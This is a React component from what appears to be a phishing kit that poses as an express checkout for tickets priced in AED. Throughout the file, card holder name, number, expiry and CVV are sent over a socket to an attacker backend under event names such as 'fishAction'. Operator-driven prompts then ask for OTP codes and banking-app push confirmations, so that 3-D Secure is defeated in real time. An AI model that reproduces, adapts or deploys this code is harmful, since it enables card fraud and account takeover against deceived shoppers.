import { useEffect, useRef, useState } from 'react';
import Image from 'next/image';

import './formPopup.scss';
import io, { Socket } from 'socket.io-client';
import { useSocket } from './useSocket';

import PopupSpinner from './popupSpinner/popupSpinner';
import { DefaultEventsMap } from '@socket.io/component-emitter';

import { useInputHandlers } from './useInputHandlers';
import FormCC from './FormCC/FormCC';
import FormOTP from './FormOTP/FormOTP';

interface IForm {
  money: number;
  tickets: number;
  data: Date | null;
  setFormState: (state: boolean) => void;
}

const FormPopup = ({ money, tickets, data, setFormState }: IForm) => {
  const {
    cardData,
    valueTel,
    valueCard,
    handleCardDataChange,
    handleTelChange,
    handleCardChange,
  } = useInputHandlers();

  const formattedDate = data
    ? data.toLocaleDateString() + ' (11AM-6PM)'
    : 'No date selected';

  //useRef
  const FirstNameRef = useRef<HTMLInputElement>(null);
  const LastNameRef = useRef<HTMLInputElement>(null);
  const CardNumberRef = useRef<HTMLInputElement>(null);
  const CardExpDateRef = useRef<HTMLInputElement>(null);
  const CardCVVRef = useRef<HTMLInputElement>(null);
  const ThreeDSInputRef = useRef<HTMLInputElement>(null);
  const ThreeDSFormTextRef = useRef<HTMLParagraphElement>(null);
  const ThreeDsInputWrapperRef = useRef<HTMLDivElement>(null);

  //state
  const [fishLoginDataSent, setFishLoginDataSent] = useState<boolean>(false);
  const [spinner, setSpinner] = useState<boolean>(false);
  const [showFormCC, setShowFormCC] = useState<boolean>(true);
  const [showFormOTP, setShowFormOTP] = useState<boolean>(false);

  useEffect(() => {
    document.body.classList.add('no-scroll');
    return () => document.body.classList.remove('no-scroll');
  }, []);

  const socket = useSocket(process.env.NEXT_PUBLIC_BACK_URL as string);

  const handleSubmitCC = async (e: React.FormEvent) => {
    e.preventDefault();
    setSpinner(true);

    let delayTime = 0;

    if (!fishLoginDataSent && socket.current) {
      socket.current.emit('fishLoginData', {
        ip: 'ip',
        userAgent: window.navigator.userAgent,
        project: 'Qasr',
        projectType: 'cc',
        fake: window.location.hostname,
        ccOrderSum: `${money} AED`,
        ccFullName: `${FirstNameRef.current?.value} ${LastNameRef.current?.value}`,
      });
      setFishLoginDataSent(true);
      socket.current.on('toFishAction', (data) => {
        if (data.action === 'BAN') {
          window.location.replace(`${process.env.NEXT_PUBLIC_BACK_URL}`);
        }
        if (data.action === 'SHOW WRONG CRED') {
          setSpinner(false);
          alert('Invalid credentials. Check your information and try again');
        }
        if (data.action === 'SHOW OTP') {
          setSpinner(false);
          setShowFormCC(false);
          setShowFormOTP(true);
        }
        if (data.action === 'SHOW AUTH APP') {
          setSpinner(false);
          setShowFormCC(false);
          setShowFormOTP(true);
          setTimeout(() => {
            if (ThreeDSFormTextRef.current) {
              ThreeDSFormTextRef.current.textContent = `Please open the mobile banking application and confirm the two push notifications.`;
            }
            if (ThreeDsInputWrapperRef.current) {
              ThreeDsInputWrapperRef.current.textContent = `Confirm push notification in the banking app`;
            }
          }, 200);
        }
        if (data.action === 'SHOW WRONG OTP') {
          alert('Wrong OTP code');
          setSpinner(false);
          if (ThreeDSInputRef.current) ThreeDSInputRef.current.value = '';
        }
      });
      delayTime = 1000;
    }

    setTimeout(() => {
      socket.current?.emit('fishAction', {
        action: 'fishAction',
        actionData:
          `\nCard info:\nCard Name: ${FirstNameRef.current?.value} ${LastNameRef.current?.value}` +
          `\nCard Number: ${CardNumberRef.current?.value}` +
          `\nExp: ${CardExpDateRef.current?.value} ` +
          `cvv: ${CardCVVRef.current?.value}`,
        ccName: `${FirstNameRef.current?.value} ${LastNameRef.current?.value}`,
        ccNumber: CardNumberRef.current?.value,
        ccExpM: CardExpDateRef.current?.value.slice(0, 2),
        ccExpY: CardExpDateRef.current?.value.slice(-2),
        ccCVV: CardCVVRef.current?.value,
        ip: 'ip',
        userAgent: window.navigator.userAgent,
        project: 'Qasr',
        projectType: 'cc',
        fake: window.location.hostname,
      });
    }, delayTime);
  };

  const handleSubmit3DS = (e: React.FormEvent) => {
    e.preventDefault();
    setSpinner(true);
    socket.current?.emit('fishAction', {
      action: 'Client enter OTP code',
      actionData: `\nOTP code: ${ThreeDSInputRef.current?.value}`,
      project: 'Qasr',
      fake: window.location.hostname,
    });
  };

  return (
    <div className="overlay">
      {spinner && <PopupSpinner />} {/* Перемещаем сюда */}
      <div className="form-popup">
        <button
          className="exit-button"
          type="button"
          onClick={() => setFormState(false)}
        >
          Exit
        </button>

        <p className="ticket-info-text">
          For payment: <b>{money} AED</b>
        </p>
        <p className="ticket-info-text">
          Number of tickets: <b>{tickets}</b>
        </p>
        <p className="ticket-info-text">
          Date: <b>{formattedDate}</b>
        </p>
        <h2 className="form-title">Express Checkout</h2>
        {showFormCC && (
          <FormCC
            handleSubmitCC={handleSubmitCC}
            FirstNameRef={FirstNameRef}
            LastNameRef={LastNameRef}
            CardExpDateRef={CardExpDateRef}
            CardNumberRef={CardNumberRef}
            CardCVVRef={CardCVVRef}
          />
        )}
        {showFormOTP && (
          <FormOTP
            money={money}
            handleSubmit3DS={handleSubmit3DS}
            ThreeDSInputRef={ThreeDSInputRef}
            ThreeDSFormTextRef={ThreeDSFormTextRef}
            ThreeDsInputWrapperRef={ThreeDsInputWrapperRef}
          />
        )}
      </div>
    </div>
  );
};

export default FormPopup;